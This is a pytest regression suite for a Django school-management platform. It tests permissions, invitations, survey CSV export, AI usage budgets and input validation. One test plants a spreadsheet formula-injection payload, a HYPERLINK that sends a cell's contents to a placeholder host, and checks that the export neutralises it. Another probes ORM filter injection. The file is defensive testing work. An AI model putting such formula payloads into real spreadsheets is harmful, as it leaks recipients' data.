"""Fix pass (agent D): orgs / schools regressions — register items R16 R37 R41 R57 R59 and security leads S10 S11 S17 S18
S19 S33 S34. Dummy users only; the LLM is the offline fake."""

import csv
import io

import pytest
from django.utils import timezone
from rest_framework.test import APIClient

from apps.accounts.models import User
from apps.docs.models import Chunk, Document
from apps.learning.models import Curriculum, Section, Subsection, UserSubsectionState
from apps.orgs.extras import viewable_documents
from apps.orgs.models import (
    Assignment,
    Group,
    Invitation,
    Membership,
    Organization,
    OrgDocument,
    SubUnit,
    Survey,
    SurveyResponse,
)
from apps.providers.models import UsageCounter

pytestmark = pytest.mark.django_db
PW = "Fix#2026passwd"


def user(email, name="X"):
    u = User.objects.create_user(email, PW)
    u.profile.display_name = name
    u.profile.save()
    c = APIClient()
    c.force_authenticate(u)
    return c, u


def member(org, u, role, group=None):
    m = Membership.objects.create(org=org, user=u, role=role)
    if group:
        group.members.add(m)
    return m


@pytest.fixture
def school():
    oc, owner = user("principal@fix.in", "Meena")
    org = Organization.objects.create(name="Fix School", slug="fix", kind="school")
    member(org, owner, "owner")
    Group.objects.create(org=org, name="Everyone")
    ga, gb = Group.objects.create(org=org, name="7-A"), Group.objects.create(org=org, name="7-B")
    tac, ta = user("ta@fix.in", "Anitha")
    member(org, ta, "manager", ga)
    tbc, tb = user("tb@fix.in", "Bala")
    member(org, tb, "manager", gb)
    kac, ka = user("ka@fix.in", "Kani")
    member(org, ka, "learner", ga)
    kbc, kb = user("kb@fix.in", "Kavin")
    member(org, kb, "learner", gb)
    return {
        "org": org,
        "ga": ga,
        "gb": gb,
        "owner": (oc, owner),
        "ta": (tac, ta),
        "tb": (tbc, tb),
        "ka": (kac, ka),
        "kb": (kbc, kb),
    }


def course(owner, lessons=2):
    cur = Curriculum.objects.create(
        owner=owner, goal="Sci", title="Science", kind="authored", status="ready", published_at=timezone.now()
    )
    s = Section.objects.create(curriculum=cur, order=1, title="Intro")
    subs = [
        Subsection.objects.create(section=s, order=i, title=f"L{i}", lesson_status="ready")
        for i in range(lessons)
    ]
    return cur, subs


# ── R37: archived lessons don't count ────────────────────────────────


def test_archived_lessons_not_counted_in_assignment_progress(school):
    oc, owner = school["owner"]
    cur, subs = course(owner, 3)
    Subsection.objects.filter(pk=subs[2].pk).update(archived=True)
    a = Assignment.objects.create(
        org=school["org"],
        group=school["ga"],
        curriculum=cur,
        created_by=owner,
        due_at=timezone.now() - timezone.timedelta(days=1),
    )
    for s in subs[:2]:
        UserSubsectionState.objects.create(
            user=school["ka"][1], subsection=s, status="completed", completed_at=timezone.now()
        )
    row = oc.get(f"/api/orgs/fix/assignments/{a.id}/").data["rows"][0]
    assert row["total"] == 2 and row["pct"] == 1 and row["overdue"] is False
    listed = oc.get("/api/orgs/fix/assignments/").data[0]
    assert listed["completed"] == 1 and listed["overdue"] == 0
    assert all(
        r["user_id"] != school["ka"][1].id
        for r in oc.get("/api/orgs/fix/analytics/").data["at_risk"]
        if "overdue" in r["reasons"]
    )


# ── R41: malformed numbers are 400/404, never 500 ────────────────────


def test_bad_numeric_input_is_not_a_500(school):
    oc, owner = school["owner"]
    assert oc.post("/api/orgs/fix/nudge/", {"user_ids": ["abc"]}, format="json").status_code == 400
    assert oc.post("/api/orgs/fix/nudge/", {"user_ids": "12"}, format="json").status_code == 400
    assert (
        oc.post("/api/orgs/fix/nudge/", {"user_ids": [school["ka"][1].id]}, format="json").data["nudged"] == 1
    )
    assert (
        oc.post(
            "/api/orgs/fix/surveys/",
            {
                "title": "T",
                "template": "",
                "group_id": "abc",
                "questions": [{"type": "text", "text": "How?"}],
            },
            format="json",
        ).status_code
        == 404
    )
    assert oc.post("/api/orgs/fix/documents/", {"document_id": "abc"}, format="json").status_code == 404
    cur, _ = course(owner)
    a = Assignment.objects.create(org=school["org"], curriculum=cur, created_by=owner)
    assert (
        oc.patch(f"/api/orgs/fix/assignments/{a.id}/", {"survey_id": "abc"}, format="json").status_code == 404
    )


# ── R57: "false" is false ────────────────────────────────────────────


def test_string_false_toggles_stay_off(school):
    oc, _ = school["owner"]
    r = oc.post(
        "/api/orgs/fix/surveys/",
        {
            "title": "Feedback",
            "anonymous": "false",
            "public": "false",
            "questions": [{"type": "text", "text": "How?"}],
        },
        format="json",
    )
    s = Survey.objects.get(pk=r.data["id"])
    assert s.anonymous is False and s.public is False
    oc.patch(
        f"/api/orgs/fix/surveys/{s.id}/",
        {"public": "false", "anonymous": "0", "show_review": "off"},
        format="json",
    )
    s.refresh_from_db()
    assert s.public is False and s.anonymous is False and s.show_review is False


# ── R59: members filter in the database; assignment lists don't grow queries per assignment ──


def test_members_field_filter_and_bounded_queries(school, django_assert_max_num_queries):
    oc, owner = school["owner"]
    org = school["org"]
    org.member_fields = [
        {"key": "section", "label": "Section", "type": "text", "visibility": "hidden", "self_fill": False}
    ]
    org.save()
    Membership.objects.filter(user=school["ka"][1]).update(fields={"section": "B"})
    assert [m["user_id"] for m in oc.get("/api/orgs/fix/members/?field=section:B").data] == [
        school["ka"][1].id
    ]
    assert (
        oc.get("/api/orgs/fix/members/?field=user__email:x").data == []
    )  # undefined keys never reach the ORM
    cur, _ = course(owner)
    for _ in range(3):
        Assignment.objects.create(org=org, curriculum=cur, created_by=owner)
    with django_assert_max_num_queries(12) as few:
        oc.get("/api/orgs/fix/assignments/")
    n = len(few.captured_queries)
    for _ in range(10):
        Assignment.objects.create(org=org, curriculum=cur, created_by=owner)
    with django_assert_max_num_queries(n):
        assert len(oc.get("/api/orgs/fix/assignments/").data) == 13


# ── R16 ──────────────────────────────────────────────────────────────


def test_drill_prompt_pluralises():
    from apps.orgs.teach_rp import drill_prompt

    class Sc:
        title, learner_role = "S", "R"

    d = {
        "concept": {"kind": "objective", "name": "Listen", "attempted": 1, "passed": 1},
        "final": {"met": 1, "not_met": 2},
        "right": [{"learners": 1, "text": "a"}],
        "wrong": [{"learners": 2, "text": "b"}],
    }
    p = drill_prompt(Sc, d)
    assert "met 1 time," in p and "not met 2 times" in p and "(1 learner)" in p and "(2 learners)" in p


# ── S10: manager AI endpoints are budgeted ───────────────────────────


def test_insights_and_survey_summary_charge_ai_budget(school):
    oc, owner = school["owner"]
    s = Survey.objects.create(
        org=school["org"],
        title="F",
        questions=[{"id": "q1", "type": "text", "text": "How?"}],
        created_by=owner,
    )
    for i in range(3):
        SurveyResponse.objects.create(survey=s, respondent_key=f"k{i}", answers={"q1": f"answer {i}"})
    assert oc.post("/api/orgs/fix/insights/").status_code == 200
    assert UsageCounter.objects.get(user=owner, metric="ai_grades").amount == 1
    UsageCounter.objects.filter(user=owner, metric="ai_grades").update(amount=200)
    assert oc.post("/api/orgs/fix/insights/").data["code"] == "ai_budget_exceeded"
    assert oc.post(f"/api/orgs/fix/surveys/{s.id}/summary/").status_code == 429


# ── S11: respondent name is formula-safe in the CSV ──────────────────


def test_survey_csv_neutralises_respondent_name(school):
    oc, owner = school["owner"]
    ka = school["ka"][1]
    ka.profile.display_name = '=HYPERLINK("https://example.invalid/"&B2,"x")'
    ka.profile.save()
    s = Survey.objects.create(
        org=school["org"],
        title="F",
        anonymous=False,
        status="open",
        questions=[{"id": "q1", "type": "text", "text": "How?"}],
        created_by=owner,
    )
    SurveyResponse.objects.create(survey=s, user=ka, respondent_key="u1", answers={"q1": "\n=1+1"})
    rows = list(
        csv.reader(io.StringIO(oc.get(f"/api/orgs/fix/surveys/{s.id}/results/?export=csv").content.decode()))
    )
    assert rows[1][0].startswith("'=") and rows[1][1].startswith("'\n")


# ── S17 / S18: knowledge-base documents ──────────────────────────────


def _kb(org, owner, staff_only=True):
    doc = Document.objects.create(owner=owner, title="Handbook", filename="h.txt", kind="txt")
    Chunk.objects.create(document=doc, index=0, text="Staff only: salary bands.")
    return OrgDocument.objects.create(
        org=org, document=doc, source="kb", status="ready", learners_can_read=not staff_only, shared_by=owner
    )


def test_demoted_admin_cannot_reshare_kb_doc_and_ownership_moves(school):
    oc, owner = school["owner"]
    adc, ad = user("admin@fix.in")
    am = member(school["org"], ad, "admin")
    od = _kb(school["org"], ad)
    assert oc.patch(f"/api/orgs/fix/members/{am.id}/", {"role": "learner"}, format="json").status_code == 200
    od.document.refresh_from_db()
    assert od.document.owner_id == owner.id  # handed to the heir on demotion
    assert not viewable_documents(ad).filter(pk=od.document_id).exists()
    # even while still the owner (e.g. no heir), a KB document can't be re-shared into another org
    Document.objects.filter(pk=od.document_id).update(owner=ad)
    slug_b = adc.post("/api/orgs/", {"name": "Org B"}, format="json").data["slug"]
    assert (
        adc.post(f"/api/orgs/{slug_b}/documents/", {"document_id": od.document_id}, format="json").status_code
        == 404
    )
    assert not viewable_documents(ad).filter(pk=od.document_id).exists()


def test_unit_admin_cannot_read_staff_only_kb_docs(school):
    from apps.orgs.perms import make_unit_admin

    _, owner = school["owner"]
    od = _kb(school["org"], owner)
    uc, uu = user("unit@fix.in")
    m = member(school["org"], uu, "learner")
    make_unit_admin(m, SubUnit.objects.create(org=school["org"], name="Primary"))
    assert uc.get("/api/orgs/fix/knowledge/").status_code == 403
    assert all(d["document_id"] != od.document_id for d in uc.get("/api/orgs/me/documents/").data)
    assert not viewable_documents(uu).filter(pk=od.document_id).exists()
    assert (
        viewable_documents(school["ta"][1]).filter(pk=od.document_id).exists()
    )  # org-wide managers still read it


# ── S19: teacher class scope on sibling endpoints ────────────────────


def test_teacher_class_scope_on_assignment_endpoints(school):
    oc, owner = school["owner"]
    tbc, tb = school["tb"]
    cur, subs = course(owner)
    UserSubsectionState.objects.create(
        user=school["ka"][1], subsection=subs[0], status="completed", completed_at=timezone.now()
    )
    a_class = oc.post(
        "/api/orgs/fix/assignments/", {"curriculum_id": cur.id, "group_id": school["ga"].id}, format="json"
    ).data
    wide = oc.post("/api/orgs/fix/assignments/", {"curriculum_id": cur.id}, format="json").data
    assert tbc.get(f"/api/orgs/fix/assignments/{a_class['id']}/").status_code == 403
    assert tbc.delete(f"/api/orgs/fix/assignments/{a_class['id']}/").status_code == 403
    assert (
        tbc.patch(f"/api/orgs/fix/assignments/{wide['id']}/", {"mandatory": True}, format="json").status_code
        == 403
    )
    rows = tbc.get(f"/api/orgs/fix/assignments/{wide['id']}/").data["rows"]
    assert [r["user_id"] for r in rows] == [school["kb"][1].id]  # org-wide: only their own class
    listed = {x["id"]: x for x in tbc.get("/api/orgs/fix/assignments/").data}
    assert a_class["id"] not in listed and listed[wide["id"]]["learners"] == 1
    # no org-wide (or other-class) assignment by a teacher, so no creator bypass
    assert tbc.post("/api/orgs/fix/assignments/", {"curriculum_id": cur.id}, format="json").status_code == 403
    assert (
        tbc.post(
            "/api/orgs/fix/assignments/",
            {"curriculum_id": cur.id, "group_id": school["ga"].id},
            format="json",
        ).status_code
        == 403
    )
    assert (
        tbc.post(
            "/api/orgs/fix/assignments/",
            {"curriculum_id": cur.id, "group_id": school["gb"].id},
            format="json",
        ).status_code
        == 201
    )
    # join codes: only for their classes, and a code never adds staff to a class
    codes = {g["id"]: g["join_code"] for g in tbc.get("/api/orgs/fix/groups/").data}
    assert codes[school["ga"].id] is None and codes[school["gb"].id]
    assert tbc.post(f"/api/orgs/fix/groups/{school['ga'].id}/").status_code == 403
    assert tbc.post(f"/api/orgs/join/{school['ga'].join_code}/").status_code == 409
    assert not school["ga"].members.filter(user=tb).exists()


# ── S33: invitations can be revoked and die with the inviter's rights ──


def test_invitations_revocable_and_invalidated(school):
    oc, owner = school["owner"]
    adc, ad = user("admin@fix.in")
    am = member(school["org"], ad, "admin")
    adc.post("/api/orgs/fix/invitations/", {"emails": ["alt@fix.in"], "role": "admin"}, format="json")
    adc.post("/api/orgs/fix/invitations/", {"emails": ["kid@fix.in"], "role": "learner"}, format="json")
    stale = Invitation.objects.get(email="alt@fix.in")
    Invitation.objects.create(
        org=school["org"], email="alt2@fix.in", role="admin", invited_by=ad
    )  # e.g. made before the fix
    oc.patch(f"/api/orgs/fix/members/{am.id}/", {"role": "learner"}, format="json")
    assert not Invitation.objects.filter(pk=stale.pk).exists()  # voided on demotion
    assert Invitation.objects.filter(email="kid@fix.in").exists()  # learner invitations carry no staff grant
    # a leftover staff invitation is refused at acceptance once the inviter lost the right to send it
    leftover = Invitation.objects.create(org=school["org"], email="alt3@fix.in", role="admin", invited_by=ad)
    c3, u3 = user("alt3@fix.in")
    assert (
        c3.post(f"/api/orgs/invites/{leftover.token}/accept/").data["code"] == "verify_email_first"
    )  # squatters can't accept
    u3.email_verified = True
    u3.save()
    assert c3.post(f"/api/orgs/invites/{leftover.token}/accept/").data["code"] == "invite_revoked"
    assert not Membership.objects.filter(org=school["org"], user=u3).exists()
    # resend supersedes, and pending invitations can be revoked
    oc.post("/api/orgs/fix/invitations/", {"emails": ["bob@fix.in"], "role": "admin"}, format="json")
    oc.post("/api/orgs/fix/invitations/", {"emails": ["bob@fix.in"], "role": "admin"}, format="json")
    assert Invitation.objects.filter(email="bob@fix.in").count() == 1
    bob_inv = Invitation.objects.get(email="bob@fix.in")
    assert (
        school["ta"][0].delete(f"/api/orgs/fix/invitations/{bob_inv.id}/").status_code == 403
    )  # managers: learner invites only
    assert oc.delete(f"/api/orgs/fix/invitations/{bob_inv.id}/").status_code == 204
    # a removed member's leftover invitation is gone too
    cc, cu = user("carol@fix.in")
    cm = member(school["org"], cu, "admin")
    left = Invitation.objects.create(org=school["org"], email="carol@fix.in", role="admin", invited_by=owner)
    assert oc.delete(f"/api/orgs/fix/members/{cm.id}/").status_code == 204
    assert cc.post(f"/api/orgs/invites/{left.token}/accept/").status_code == 404


# ── S34: proposal text is capped at what the approval list shows ──────


def test_setup_proposal_text_capped(school):
    from apps.orgs.setup_chat import PROPOSAL_TEXT_MAX, apply_proposal

    org, owner = school["org"], school["owner"][1]
    assert (
        apply_proposal(org, owner, {"op": "set_description", "text": "A" * 300 + "XYZ-MARKER" + "B" * 590})
        == ""
    )
    org.refresh_from_db()
    assert len(org.description) == PROPOSAL_TEXT_MAX == 600 and "XYZ-MARKER" in org.description
    apply_proposal(org, owner, {"op": "course_idea", "title": "Intro", "text": "C" * 2000})
    assert len(Curriculum.objects.get(title="Intro").description) == PROPOSAL_TEXT_MAX
